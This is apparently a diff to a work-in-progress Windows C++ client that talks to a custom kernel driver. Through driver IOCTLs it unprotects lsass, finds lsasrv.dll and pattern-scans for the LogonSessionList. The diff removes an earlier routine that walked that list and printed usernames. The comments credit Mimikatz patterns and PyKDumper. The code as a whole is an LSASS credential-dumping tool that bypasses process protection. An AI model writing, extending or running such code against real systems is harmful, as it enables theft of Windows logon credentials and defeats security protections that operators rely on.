@@ -30,6 +30,7 @@ typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
 	);
 
 
+
 //We need the IOCTL and Request struct.
 namespace driver {
 	namespace codes {
@@ -52,7 +53,7 @@ namespace driver {
 
 		constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
 
-
+		constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
 	}
 
 	struct Request {
@@ -61,6 +62,10 @@ namespace driver {
 		PVOID pBuffer;
 		SIZE_T sSize;
 		SIZE_T sReturn_size;
+		PVOID pBase;
+		PVOID pEnd;
+		ULONG_PTR offset; //FIND ITS IN DRIVER BUT CANT PASS TO USERMODE?
+		//PVOID offset;
 	};
 
 	bool attachToProcess(const DWORD PID, HANDLE hDriver) {
@@ -92,13 +97,22 @@ namespace driver {
 		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
 	}
 
-}
+	ULONG findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {		
+		Request req;
+		req.pBase = pBase;
+		req.pEnd = pEnd;
 
+		printf("Base: 0x%p\n", req.pBase);
+		printf("End : 0x%p\n", req.pEnd);
 
-
-bool Extract() {
-
-	return true;
+		req.offset = NULL;
+		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
+		if (req.offset == NULL) {
+			printf("DeviceIoControl error getting pLssl,,.,.\n");
+		}
+		printf("Pattern @ 0x%p", req.offset);
+		return req.offset;
+	}
 }
 
 
@@ -172,7 +186,7 @@ static BOOL ReadUnicodeStringRemote(
 }
 
 
-bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase) {
+bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize ) {
 	*pTargetModuleBase = NULL;
 	printf("In NTLM\n");
 	
@@ -185,6 +199,7 @@ bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase) {
 		printf("LDR\n");
 		return FALSE;
 	}
+
 	printf("retrieved remote head entry addr\n");
 
 
@@ -240,6 +255,7 @@ bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase) {
 		// Compare
 		if (_wcsicmp(fullPath, wTargetDLL) == 0) {
 			*pTargetModuleBase = entry.DllBase;
+			*pSize = entry.SizeOfImage;
 			printf("MODULE FOUND!!!\n");
 			return TRUE;
 		}
@@ -284,68 +300,6 @@ typedef struct _LSA_LOGON_SESSION {
 } LSA_LOGON_SESSION;
 
 
-
-
-bool findLogonSessionList(HANDLE hTarget, HMODULE hLsasrv) {
-	printf("Entered\n");
-	PVOID logonListHeadAddr = (PBYTE)hLsasrv + 0x000000000006e384;  // base addr + offset found in windbg 
-	//by seasrching for byte sequence found on github source of mim for 
-	//BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
-	printf("Logon list offset\n");
-
-	//https://github.com/uf0o/PykDumper/blob/master/PyKDumper/PyKDumper3.py
-	//According to this the list begins at logonLiastAddr + 0x90 = username, +0xa0 = domain
-	LIST_ENTRY headLE = { 0 };
-	if (!ReadProcessMemory(hTarget, logonListHeadAddr, &headLE, sizeof(headLE), NULL)) {
-		printf("headLE error...\n");
-		return false;
-	}
-	printf("retrieved remote head entry addr\n");
-
-	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
-	PLIST_ENTRY remoteCurrentAddr = headLE.Flink;
-
-
-	PVOID remoteHeadAddr = (PLIST_ENTRY)logonListHeadAddr;
-	printf("Out of while loops\n");
-	while (remoteCurrentAddr != (PLIST_ENTRY)remoteHeadAddr) {
-		// Read the current remote LIST_ENTRY
-		LIST_ENTRY curLE = { 0 };
-		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL)) {
-			printf("Error retrieving list entry\n");
-			return false;
-		}
-
-		BYTE* entryBase = (BYTE*)remoteCurrentAddr - offsetof(LSA_LOGON_SESSION, ListEntry); //i have no idea why
-
-		//this addr is also the beginning of this lls entry.
-		LSA_LOGON_SESSION curLLS = { 0 };
-		if (!ReadProcessMemory(hTarget, entryBase, &curLLS, sizeof(curLLS), NULL)) {
-			printf("Error retrieving list lsa logon session list\n");
-			return false;
-		}
-
-		if (curLLS.UserName.Length > 0 && curLLS.UserName.Buffer) {
-			SIZE_T bytesRead = 0;
-			PWSTR username = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
-				curLLS.UserName.Length + sizeof(WCHAR));
-			if (username) {
-				if (ReadProcessMemory(hTarget,
-					curLLS.UserName.Buffer,
-					username,
-					curLLS.UserName.Length,
-					&bytesRead)) {
-					wprintf(L"Username: %s\n", username);
-				}
-				HeapFree(GetProcessHeap(), 0, username);
-			}
-		}
-
-		remoteCurrentAddr = curLE.Flink;
-	}
-	return true;
-}
-
 int main(int argc, wchar_t* argv[]) {
 	//Driver stuf...
 
@@ -364,6 +318,8 @@ int main(int argc, wchar_t* argv[]) {
 		return 0;
 	}
 
+	PVOID pERPROCESS = NULL;
+
 	//Driver is attaching to target process via PID.
 	if (driver::attachToProcess(TargetPID, hDriver) == true) {
 		printf("Attached!\n");
@@ -375,6 +331,15 @@ int main(int argc, wchar_t* argv[]) {
 	if (driver::unprotect(hDriver) == true) {
 		printf("Removed protections from target process...\n");
 	}
+
+
+	
+	//PVOID pEPROCESS = driver::getEPROCESS(hDriver);
+
+	//printf("EPROCESS found at 0x%p....\n", pEPROCESS);
+
+	//Retr EPROCESS
+
 	
 	//Now that process protections are disabled we can ready process memory from userland.
 
@@ -394,22 +359,33 @@ int main(int argc, wchar_t* argv[]) {
 
 	printf("PEB Pointer found\n");
 
-	printf("Bytes: %d\n", sBytesTransferred);
+	printf("Bytes: %zu\n", sBytesTransferred);
 	
 	PVOID pLsasrv = NULL;
+	ULONG uSize = NULL;
 	printf("Outside NTLM\n");
-	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv);
+	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv,&uSize);
+
 	HMODULE hLsasrv = NULL;
 	SIZE_T sLsasrv;
 	if (!ReadProcessMemory(hTarget, pLsasrv, &hLsasrv, sizeof(HMODULE), &sLsasrv)) {
 		printf("Error reading lsasrv.dll from lsass...\n");
 	}
+	ULONG_PTR uLslOffset = 0;
+	PVOID pEnd = (BYTE*)pLsasrv + (SIZE_T)uSize;
 
-	printf("Finding logon session list...\n");
-	if (!findLogonSessionList(hTarget, hLsasrv)) {
-		printf("logonsselist erro");
+	uLslOffset = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+
+	if (uLslOffset == 0) {
+		printf("Error finding LSL offset...\n");
 	}
-	
+
+	PVOID pLogonSessionList = (PVOID)((ULONG_PTR)pLsasrv + uLslOffset); //matches earlier calculation..hopefully..
+
+	printf("Logon Session List: 0x%p...\n", pLogonSessionList);
+
+	//now confirm in windbg?
+
 
 	std::cout << "Hello world\n";
 
